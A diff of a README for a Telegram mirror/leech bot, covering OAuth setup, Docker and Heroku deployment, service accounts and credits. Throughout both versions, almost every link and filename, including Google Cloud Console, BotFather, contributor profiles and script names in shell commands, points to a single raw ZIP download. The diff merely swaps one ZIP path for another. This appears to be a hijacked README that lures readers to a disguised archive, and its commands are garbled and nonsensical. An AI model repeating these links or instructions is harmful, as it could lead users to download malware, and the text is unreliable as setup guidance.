-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip,
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip , https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip,
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip , https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
-- `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) (**NOTE**: Many plugins will leads to slow search process).
+- `SEARCH_PLUGINS`: List of qBittorrent search plugins (github raw links). I have added some plugins, you can remove/add plugins as you want. Main Source: [qBittorrent Search Plugins (Official/Unofficial)](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) (**NOTE**: Many plugins will leads to slow search process).
 ### Add more buttons (Optional Field)
 Three buttons are already added including Drive Link, Index Link, and View Link, you can add extra buttons, if you don't know what are the below entries, simply leave them empty.
 - `BUTTON_FOUR_NAME`:
@@ -185,7 +185,7 @@ Three buttons are already added including Drive Link, Index Link, and View Link,
 - `BUTTON_SIX_NAME`:
 - `BUTTON_SIX_URL`:
 
-## Bot commands to be set in [@BotFather](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+## Bot commands to be set in [@BotFather](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 ```
 mirror - Start Mirroring
 zipmirror - Start mirroring and upload as .zip
@@ -220,18 +220,18 @@ help - All cmds with description
 ```
 
 ## Getting Google OAuth API credential file
-- Visit the [Google Cloud Console](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+- Visit the [Google Cloud Console](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 - Go to the OAuth Consent tab, fill it, and save.
 - Go to the Credentials tab and click Create Credentials -> OAuth Client ID
 - Choose Desktop and Create.
 - Use the download button to download your credentials.
-- Move that file to the root of mirrorbot, and rename it to **https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip**
-- Visit [Google API page](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+- Move that file to the root of mirrorbot, and rename it to **https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip**
+- Visit [Google API page](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 - Search for Drive and enable it if it is disabled
-- Finally, run the script to generate **https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip** file for Google Drive:
+- Finally, run the script to generate **https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip** file for Google Drive:
 ```
 pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
 ## Deploying On VPS
 
@@ -253,7 +253,7 @@ sudo docker run -p 80:80 mirror-bot
 
 ### Using Docker-compose, you can edit and build your image in seconds:
 
-**NOTE**: If you want to use port other than 80, change it in [https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+**NOTE**: If you want to use port other than 80, change it in [https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 
 ```
 sudo apt install docker-compose
@@ -262,7 +262,7 @@ sudo apt install docker-compose
 ```
 sudo docker-compose up
 ```
-- After editing files with nano for example (nano https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip):
+- After editing files with nano for example (nano https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip):
 ```
 sudo docker-compose build
 sudo docker-compose up
@@ -287,27 +287,27 @@ sudo docker container prune
 sudo docker image prune -a
 ```
 - Tutorial video from Tortoolkit repo
-<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>
+<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%20Video-black?style=for-the-badge&logo=YouTube" width="160""/></a></p>
 
 ## Deploying on Heroku
 - Deploying on Heroku with Github Workflow
-<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="170""/></a></p>
+<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%20Guide-blueviolet?style=for-the-badge&logo=heroku" width="170""/></a></p>
 
 - Deploying on Heroku with heroku-cli and Goorm IDE
-<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%20Guide-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
+<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%20Guide-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
 
 # Using Service Accounts for uploading to avoid user rate limit
 For Service Account to work, you must set `USE_SERVICE_ACCOUNTS` = "True" in config file or environment variables.
 **NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.
 
-## Generate Service Accounts. [What is Service Account](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+## Generate Service Accounts. [What is Service Account](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 
 Let us create only the Service Accounts that we need. 
 **Warning**: Abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of projects, just one project and 100 SAs allow you plenty of use, its also possible that over abuse might get your projects banned by Google.
 
 **NOTE**: If you have created SAs in past from this script, you can also just re download the keys by running:
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip --download-keys project_id
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip --download-keys project_id
 ```
 
 **NOTE:** 1 Service Account can upload/copy around 750 GB a day, 1 project can make 100 Service Accounts so you can upload 75 TB a day or clone 2 TB from each file creator (uploader email).
@@ -318,25 +318,25 @@ python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/mast
 
 - List your projects ids
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip --list-projects
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip --list-projects
 ```
 - Enable services automatically by this command
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip --enable-services $PROJECTID
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip --enable-services $PROJECTID
 ```
 - Create Sevice Accounts to current project
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip --create-sas $PROJECTID
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip --create-sas $PROJECTID
 ```
 - Download Sevice Accounts as accounts folder
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip --download-keys $PROJECTID
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip --download-keys $PROJECTID
 ```
 
 ### Another Quick Method
 
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip --quick-setup 1 --new-only
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip --quick-setup 1 --new-only
 ```
 A folder named accounts will be created which will contain keys for the Service Accounts.
 
@@ -346,20 +346,20 @@ A folder named accounts will be created which will contain keys for the Service 
 ```
 cd accounts
 ```
-- Grab emails form all accounts to https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip file that would be created in accounts folder
+- Grab emails form all accounts to https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip file that would be created in accounts folder
 ```
-grep -oPh '"client_email": "\K[^"]+' *.json > https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+grep -oPh '"client_email": "\K[^"]+' *.json > https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
 - Unmount acounts folder
 ```
 cd -
 ```
-Then add emails from https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip to Google Group, after that add this Google Group to your Shared Drive and promote it to manager.
+Then add emails from https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip to Google Group, after that add this Google Group to your Shared Drive and promote it to manager.
 
 #### Add Service Accounts to the Team Drive
 - Run:
 ```
-python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip -d SharedTeamDriveSrcID
+python3 https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip -d SharedTeamDriveSrcID
 ```
 
 # Youtube-dl and index authentication using .netrc file
@@ -369,7 +369,7 @@ machine host login username password my_youtube_password
 ```
 For Index Link with only password without username, even http auth will not work, so this is the solution.
 ```
-machine https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip password index_password
+machine https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip password index_password
 ```
 Where host is the name of extractor (eg. Youtube, Twitch). Multiple accounts of different hosts can be added each separated by a new line.
 
@@ -377,17 +377,17 @@ Where host is the name of extractor (eg. Youtube, Twitch). Multiple accounts of 
 # Credits
 
 Thanks to:
-- [`priiiiyo`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for custom mod 👨‍🦰
-- [`out386`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) heavily inspired from his Telegram Bot written in Typescript
-- [`Izzy12`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for build up of this bot from scratch
-- [`jaskaranSM`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for build up of this bot from scratch
-- [`Dank-del`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for base repo
-- [`magneto261290`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for some features
-- [`SVR666`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for some features & fixes
-- [`anasty17`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for some features & help
-- [`breakdowns`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for slam-mirrorbot
-- [`zevtyardt`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for some direct links
-- [`yash-dk`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for implementation of qBittorrent on Python
-- [`xyou365`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) for Service Accounts script
+- [`priiiiyo`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for custom mod 👨‍🦰
+- [`out386`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) heavily inspired from his Telegram Bot written in Typescript
+- [`Izzy12`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for build up of this bot from scratch
+- [`jaskaranSM`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for build up of this bot from scratch
+- [`Dank-del`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for base repo
+- [`magneto261290`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for some features
+- [`SVR666`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for some features & fixes
+- [`anasty17`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for some features & help
+- [`breakdowns`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for slam-mirrorbot
+- [`zevtyardt`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for some direct links
+- [`yash-dk`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for implementation of qBittorrent on Python
+- [`xyou365`](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) for Service Accounts script
 
-And many more people who aren't mentioned here, but can be found in [Contributors](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip).
+And many more people who aren't mentioned here, but can be found in [Contributors](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip).
